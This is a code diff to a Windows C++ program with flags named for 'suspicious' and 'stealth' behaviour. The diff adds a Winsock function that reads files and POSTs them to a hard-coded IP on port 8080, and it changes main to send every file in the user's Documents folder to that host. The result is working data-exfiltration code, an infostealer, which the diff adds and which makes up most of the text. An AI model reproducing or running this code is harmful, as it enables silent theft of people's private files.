@@ -9,13 +9,16 @@
 #include <string>
 #include <iostream>
 #include <filesystem>
+#include <fstream>
+
+
 namespace fs = std::filesystem;
 
 #define susBehaviour false
 #define stealthBehaviour false
 
 #define SERV_PORT 8080 // The port the HTTP POST request will be sent to
-const char szHost[] = "192.168.1.140";
+const char szHost[] = "192.168.1.139";
 
 // Function to generate a user-friendly error message based on the error code
 const char* FormatErrorMessage(DWORD errorCode){
@@ -33,6 +36,99 @@ const char* FormatErrorMessage(DWORD errorCode){
 	// Return the error message
 	return errorMessage;
 }
+
+void sendFile(std::string path, std::string fileName) {
+	// Initialize Winsock
+	WSADATA wsaData;
+	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+	if (iResult != 0) {
+		printf("WSAStartup failed with error: %d\n", iResult);
+		return;
+	}
+	// Create a socket
+	SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	if (ConnectSocket == INVALID_SOCKET) {
+		printf("socket failed with error: %ld\n", WSAGetLastError());
+		WSACleanup();
+		return;
+	}
+	// Resolve the server address and port
+	struct sockaddr_in clientService;
+	clientService.sin_family = AF_INET;
+	clientService.sin_addr.s_addr = inet_addr(szHost);
+	clientService.sin_port = htons(SERV_PORT);
+	// Connect to server.
+	iResult = connect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
+	if (iResult == SOCKET_ERROR) {
+		printf("connect failed with error: %d\n", WSAGetLastError());
+		closesocket(ConnectSocket);
+		WSACleanup();
+		return;
+	}
+	// Load the file from the disk
+	std::ifstream in(path, std::ios::binary);
+	if (!in) {
+		printf("Failed to open file %s for reading\n", path.c_str());
+		return;
+	}
+	// Get the file size
+	in.seekg(0, std::ios::end);
+	int fileSize = in.tellg();
+	in.seekg(0, std::ios::beg);
+	// Allocate memory for the file
+	char* fileBuffer = new char[fileSize];
+	// Read the file into memory
+	in.read(fileBuffer, fileSize);
+	in.close();
+	// Assemble a HTTP POST request
+	// FORMAT:
+	/*
+		POST / HTTP/1.1
+		Host: localhost:8080
+		Content-Type: multipart/form-data; boundary=MY_BOUNDARY
+
+		--MY_BOUNDARY
+		Content-Disposition: form-data; name="file"; filename="myfile.txt"
+
+		[file data]
+		--MY_BOUNDARY--
+	*/
+	std::string request = "POST / HTTP/1.1\r\n";
+	request += "Host: " + std::string(szHost) + ":" + std::to_string(SERV_PORT) + "\r\n";
+	request += "Content-Type: multipart/form-data; boundary=MY_BOUNDARY\r\n\r\n";
+	request += "--MY_BOUNDARY\r\n";
+	request += "Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\n\r\n";
+	request += std::string(fileBuffer, fileSize);
+	request += "\r\n--MY_BOUNDARY--\r\n";
+	std::cout << request << std::endl;
+	// Send the HTTP POST request
+	iResult = send(ConnectSocket, request.c_str(), request.length(), 0);
+	if (iResult == SOCKET_ERROR) {
+		printf("send failed with error: %d\n", WSAGetLastError());
+		closesocket(ConnectSocket);
+		WSACleanup();
+		return;
+	}
+	// Receive the HTTP response
+	/*
+	char recvbuf[1024];
+	iResult = recv(ConnectSocket, recvbuf, 1024, 0);
+	if (iResult > 0) {
+		printf("Response: %s\n", recvbuf);
+	}
+	else if (iResult == 0) {
+		printf("Connection closed\n");
+	}
+	else {
+		printf("recv failed with error: %d\n", WSAGetLastError());
+	}
+	*/
+	// Cleanup
+	closesocket(ConnectSocket);
+	WSACleanup();
+}
+
+
 
 int main() {
 #if stealthBehaviour
@@ -75,18 +171,10 @@ int main() {
 	fs::path downloadsPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Downloads");
 	fs::path picturesPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Pictures");
 	fs::path documentsPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Documents");
-	// Iterate through all files
-	for (const auto& entry : fs::directory_iterator(desktopPath)) {
-		std::cout << entry.path() << std::endl;
-	}
-	for (const auto& entry : fs::directory_iterator(desktopPath)) {
-		std::cout << entry.path() << std::endl;
-	}
-	for (const auto& entry : fs::directory_iterator(picturesPath)) {
-		std::cout << entry.path() << std::endl;
-	}
+	// Iterate through files
 	for (const auto& entry : fs::directory_iterator(documentsPath)) {
 		std::cout << entry.path() << std::endl;
+		sendFile(entry.path().string(), entry.path().filename().string());
 	}
 
 	getchar();
